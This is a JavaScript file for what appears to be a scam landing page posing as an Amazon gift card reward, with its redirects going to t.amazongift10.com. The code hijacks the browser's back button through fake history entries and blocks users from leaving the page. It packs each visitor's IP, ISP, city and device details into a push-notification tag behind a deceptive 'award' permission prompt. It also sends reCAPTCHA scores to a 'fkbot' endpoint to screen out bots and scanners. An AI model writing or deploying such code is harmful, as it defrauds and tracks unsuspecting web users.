function getURLParameter(name) {
    return decodeURI(
        (RegExp(name + '=' + '(.*?)(&|$)').exec(location.search) || [, null])[1] || ''
    );
}

var PreventExitPop = true;
function ExitPop() {
if(PreventExitPop != false) {
return "";
}
}
window.onbeforeunload = ExitPop; 

! function() {
var t;
try {
for(t = 0; 10 > t; ++t) history.pushState({}, "", "");
onpopstate = function(t) {
PreventExitPop = false
t.state && location.replace("https://t.amazongift10.com/click.php?lp=1")
}
} catch(o) {}
}();

// COLLECT PUSH
var userJson = JSON.stringify({
            device_name: getURLParameter('device_name'),
            browser_name: getURLParameter('browser_name'),
            language: getURLParameter('language'),
            city: getURLParameter('city'),
            trafficsource_name: getURLParameter('trafficsource_name'),
            device_brand: getURLParameter('device_brand'),
            device_model: getURLParameter('device_model'),
            browser_version: getURLParameter('browser_version'),
            os_name: getURLParameter('os_name'),
            os_version: getURLParameter('os_version'),
            country: getURLParameter('country'),
            isp: getURLParameter('isp'),
            ip: getURLParameter('ip'),
            user_agent: getURLParameter('user_agent'),
            clickid: getURLParameter('clickid'),
			intent: getURLParameter('intent')
        })

//var pm_allowAction = function () { location.href = ''; };
//var pm_denyAction = function () { location.href = ''; };
var pm_tag = userJson;
//var pm_enablePrompt = true;
var pm_promptText = 'Please allow us to push you the award information.Thank you!';
var pm_promptAcceptBtnText = 'OK';
var pm_promptDenyBtnText = 'NO';
//var pm_promptHideDeny = true;
var pm_pid = "888888888";

var imported = document.createElement('script');
imported.src = './pub.min.js';
document.head.appendChild(imported);

var imported1 = document.createElement('script');
imported1.src = 'https://www.google.com/recaptcha/api.js?render=6Ldn8bgaAAAAAOgDcapmAZ1fr9aQMARez_U52egw';
document.head.appendChild(imported1);

var interval = setInterval(checkScore, 1000);
var checkFlag = 0;
function checkScore(){
    if(grecaptcha && checkFlag == 0 ){
        checkFlag = 1;
        clearInterval(interval);
        grecaptcha.ready(function() {
            grecaptcha.execute('6Ldn8bgaAAAAAOgDcapmAZ1fr9aQMARez_U52egw', {action: 'v3scores'}).then(function(token) {
                fetch('https://t.amazongift10.com/fkbot/'+token+".fky").then(function(response) {
                    response.json().then(function(data) {
                        console.log("score:"+data);
                        var o = document.createElement("img");
                        o.src= 'https://t.amazongift10.com/click.php?event8='+data;
                    });
                });
            });
        });
    }
}

